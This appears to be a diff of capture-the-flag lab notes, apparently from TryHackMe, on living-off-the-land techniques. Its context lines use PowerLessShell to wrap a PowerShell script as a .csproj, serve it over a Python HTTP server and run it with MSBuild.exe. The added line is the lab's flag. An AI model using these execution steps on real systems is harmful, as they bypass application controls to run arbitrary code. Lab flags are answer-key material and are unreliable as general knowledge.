@@ -155,6 +155,7 @@ python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0f
 python3 -m http.server [IP]
 -run the .csproj file using MSBuild.exe
 C:\Users\thm> c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
+THM{23005dc4369a0eef728aa39ff8cc3be2}
 
 
 
